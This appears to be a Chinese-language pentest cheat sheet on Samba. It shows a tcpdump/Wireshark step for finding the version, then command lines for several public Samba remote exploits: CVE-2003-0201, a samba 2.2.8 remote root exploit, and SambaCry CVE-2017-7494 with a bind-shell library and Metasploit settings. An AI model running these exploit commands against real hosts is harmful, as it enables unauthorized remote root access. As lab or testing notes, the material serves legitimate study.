### Nmap无法识别版本时，可查看数据包

tcpdump -i tun0 -p -s 0 -w smb.pcap
wireshark smb.pcap  得到版本信息

## CVE

### Samba 2.2.x - Remote Buffer Overflow CVE-2003-0201

https://www.exploit-db.com/exploits/7

```bash
perl 7.pl -M B -p 139 -t linx86 -H IP -h <IP>
```

### samba-2.2.8 < remote root exploit

https://www.exploit-db.com/exploits/10

```bash
# ./sambal -b 0 -v <IP>
```

### SambaCry exploit and vulnerable container (CVE-2017-7494)

https://github.com/opsxcq/exploit-CVE-2017-7494

```bash
python exploit.py -t <IP> -e libbindshell-samba.so -s SusieShare -r /SusieShare/libbindshell-samba.so -u anonymous -p anonymous -P 445
```

```bash
# 此模块会触发 Samba 版本 3.5.0 到 4.4.14、4.5.10 和 4.6.4 中的任意共享库加载漏洞。此模块需要有效凭据、可访问共享中的可写文件夹以及可写文件夹的服务器端路径的知识。在某些情况下，匿名访问结合常见的文件系统位置可用于自动利用此漏洞。
use linux/samba/is_known_pipename
set SMB::PROTOCOLVERSION 1
set SMB::ALWAYSENCRYPT false

set SMBUser <user>
set SMBPass <password>
set SMB::AlwaysEncrypt false
set SMB::ProtocolVersion 2,3
```

